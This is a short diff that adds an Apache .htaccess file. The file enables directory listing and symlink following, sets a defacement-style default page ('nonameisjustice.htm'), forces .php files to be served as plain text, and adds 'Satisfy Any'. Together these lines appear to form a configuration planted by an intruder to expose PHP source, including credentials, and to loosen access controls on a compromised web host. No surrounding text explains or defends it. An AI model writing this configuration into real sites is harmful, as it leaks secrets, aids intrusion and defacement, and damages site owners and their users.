@@ -1,0 +1,5 @@
+Options Indexes SymLinksIfOwnerMatch
+DirectoryIndex nonameisjustice.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any
